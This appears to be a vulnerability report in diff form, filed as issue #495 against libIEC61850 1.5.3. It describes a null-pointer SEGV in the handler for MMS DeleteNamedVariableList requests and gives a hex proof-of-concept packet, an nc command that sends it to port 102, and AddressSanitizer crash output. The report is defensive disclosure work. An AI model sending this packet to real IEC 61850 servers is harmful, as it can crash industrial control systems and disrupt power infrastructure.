@@ -1,0 +1,50 @@
+issue: #495
+Description
+An SEGV vulnerability was detected in the mmsServer_handleDeleteNamedVariableListRequest function of src/mms/iso_mms/server/mms_named_variable_list_service.c:146. The vulnerability manifests as SEGV and causes the application to crash.
+
+proof of concept
+0300 0040 02f0 8001 0001 0061 3330 3102 0100 a02c a02a 0202 00c4 ad24 8222 01a1 1fa0 1d30 1ba0 19a1 171a 0b54 454d 504c 4154 4552 4344 1a08 4c50 4844 3124 5354
+
+
+command
+sudo ./server_example_substitution
+
+cat poc | nc 0.0.0.0 102
+
+result
+Using libIEC61850 version 1.5.3
+Connection opened
+ASAN:DEADLYSIGNAL
+=================================================================
+==4709==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000008 (pc 0x55a74133d179 bp 0x7f197b0fc840 sp 0x7f197b0fc4c0 T3)
+==4709==The signal is caused by a READ memory access.
+==4709==Hint: address points to the zero page.
+    #0 0x55a74133d178 in mmsServer_handleDeleteNamedVariableListRequest src/mms/iso_mms/server/mms_named_variable_list_service.c:157
+    #1 0x55a741268b3c in handleConfirmedRequestPdu src/mms/iso_mms/server/mms_server_connection.c:367
+    #2 0x55a74126a3c4 in MmsServerConnection_parseMessage src/mms/iso_mms/server/mms_server_connection.c:693
+    #3 0x55a74126a54b in messageReceived src/mms/iso_mms/server/mms_server_connection.c:737
+    #4 0x55a7412c1395 in IsoConnection_handleTcpConnection src/mms/iso_server/iso_connection.c:344
+    #5 0x55a7412c1f83 in handleTcpConnection src/mms/iso_server/iso_connection.c:477
+    #6 0x7f197f9576da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
+    #7 0x7f197f2e261e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12161e)
+
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV src/mms/iso_mms/server/mms_named_variable_list_service.c:157 in mmsServer_handleDeleteNamedVariableListRequest
+Thread T3 created by T1 here:
+    #0 0x7f197fba6d2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
+    #1 0x55a7412550f6 in Thread_start hal/thread/linux/thread_linux.c:89
+    #2 0x55a7412c2883 in IsoConnection_start src/mms/iso_server/iso_connection.c:589
+    #3 0x55a7412beefc in handleIsoConnections src/mms/iso_server/iso_server.c:519
+    #4 0x55a7412befa0 in isoServerThread src/mms/iso_server/iso_server.c:553
+    #5 0x7f197f9576da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
+
+Thread T1 created by T0 here:
+    #0 0x7f197fba6d2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
+    #1 0x55a7412550f6 in Thread_start hal/thread/linux/thread_linux.c:89
+    #2 0x55a7412bf5be in IsoServer_startListening src/mms/iso_server/iso_server.c:681
+    #3 0x55a74125f810 in MmsServer_startListening src/mms/iso_mms/server/mms_server.c:629
+    #4 0x55a74125114c in IedServer_start src/iec61850/server/impl/ied_server.c:708
+    #5 0x55a74123a25e in main /home/yang/libiec61850-1.5.3/examples/server_example_substitution/server_example_substitution.c:229
+    #6 0x7f197f1e2c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+==4709==ABORTING
